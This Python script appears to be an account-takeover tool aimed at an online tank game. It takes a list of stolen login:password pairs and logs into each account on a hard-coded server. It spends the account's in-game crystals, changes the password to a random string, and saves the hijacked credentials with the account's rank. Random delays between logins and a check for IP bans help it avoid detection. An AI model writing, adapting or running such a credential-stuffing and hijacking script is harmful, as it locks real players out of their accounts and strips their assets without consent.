from proxyclient import ProxyClient
import random
import utils
import sys
import time
import os
import coloredlogs, logging

coloredlogs.install(level='DEBUG', fmt='%(asctime)s [%(levelname)s] %(message)s')

# Settings
destination_ip = "135.125.188.169"
destination_port = 6969
delay_min = 30
delay_max = 60

# Items to buy
random_items = ["flora_m0", "marine_m0", "marsh_m0", "forester_m0", "dirt_m0", "guerilla_m0", "desert_m0", "urban_m0", "kedr_m0", "blizzard_m0", "rust_m0", "standstone_m0", "tina_m0", "vortex_m0", "shark_m0", "eagle_m0", "spider_m0", "fracture_m0", "spider_m0", "fox_m0", "badger_m0", "grizzly_m0"]
exact_items = [
    [20000, "1000_scores_m0", 4000],
    [50, "armor_m0", 50],
    [50, "double_damage_m0", 50],
    [50, "n2o_m0", 50],
    [150, "health_m0", 150]
]

# info
rangs = {
    1: "Новобранец",
    2: "Рядовой",
    3: "Ефрейтор",
    4: "Капрал",
    5: "Мастер-капрал",
    6: "Сержант",
    7: "Штаб-сержант",
    8: "Мастер-сержант",
    9: "Первыйсержант",
    10: "Сержант-майор",
    11: "Уорэнт-офицер 1",
    12: "Уорэнт-офицер 2",
    13: "Уорэнт-офицер 3",
    14: "Уорэнт-офицер 4",
    15: "Уорэнт-офицер 5",
    16: "Младший лейтенант",
    17: "Лейтенант",
    18: "Старший лейтенант",
    19: "Капитан",
    20: "Майор",
    21: "Подполковник",
    22: "Полковник",
    23: "Бригадир",
    24: "Генерал-майор",
    25: "Генерал-лейтенант",
    26: "Генерал",
    27: "Маршал",
    28: "Фельдмаршал",
    29: "Командор",
    30: "Генералиссимус",
    31: "Легенда"
}

def buy_rnd_item(client, crystalls, min_crystalls, item_name, item_price):
    if crystalls > min_crystalls:
        max_count = crystalls // item_price
        count = random.randint(1, max_count)
        client.buy_item(item_name, count)
        crystalls -= count * item_price
        logging.info(f"Bought {count} {item_name}")
    return crystalls

def buy_rnd_items(client, crystalls):
    random.shuffle(exact_items)
    # Buy effects
    for item in exact_items:
        crystalls = buy_rnd_item(client, crystalls, item[0], item[1], item[2])
    # Buy random items
    if crystalls > 5000:
        for item in random_items:
            client.buy_item(item, 1)

def change_rnd_password(client):
    password_length = random.randint(5, 12)
    random_pwd = utils.random_string(password_length)
    isChanged = client.change_password(password, random_pwd)
    if isChanged:
        logging.info(f"Changed password on {login} to {random_pwd}")
        return random_pwd
    logging.warning(f"Can't change password on {login}")
    return password

if __name__ == '__main__':
    data_path = os.path.join(os.getcwd(), "data")
    accounts_file = "accounts.txt"
    if len(sys.argv) > 1:
        data_path = sys.argv[1]
    if len(sys.argv) > 2:
        accounts_file = sys.argv[2]
    accounts_path = os.path.join(data_path, accounts_file)
    processed_path = os.path.join(data_path, "proccessed.txt")
    errors_path = os.path.join(data_path, "errors.txt")
    remain_path = os.path.join(data_path, "remain.txt")
    accounts = utils.read_file(accounts_path)
    remain = accounts.copy()
    for account in accounts:
        login, _, password = account.partition(':')
        client = ProxyClient(destination_ip, destination_port)
        try:
            try:
                client.handshake()
            except Exception:
                logging.critical("IP BANNED!")
                break
            current_user = client.auth(login, password)
            if current_user is None:
                raise Exception(f"{login} is online!")
            elif not current_user:
                logging.error(f"Invalid credentials {account}")
            else:
                crystalls = current_user['crystall']
                current_rang_id = current_user['rang']
                current_rang = rangs[current_rang_id]
                buy_rnd_items(client, crystalls)
                password = change_rnd_password(client)
                utils.write_file(processed_path, f"{login}:{password}|{current_rang}\n", True)
                logging.info(f"Processed account {login} with the rang of {current_rang}")  
        except Exception as e:
            logging.error(e)
            utils.write_file(errors_path, f"{login}:{password}\n", True)
            logging.error(f"Error with account {account}")
        remain.remove(account)
        utils.write_lines(remain_path, remain)
        client.disconnect()
        random_delay = random.randint(delay_min, delay_max)
        logging.info(f"{len(remain)} of {len(accounts)} accounts left")
        logging.info(f"Sleeping {random_delay} seconds..")
        time.sleep(random_delay)
    input("Press enter to exit..")
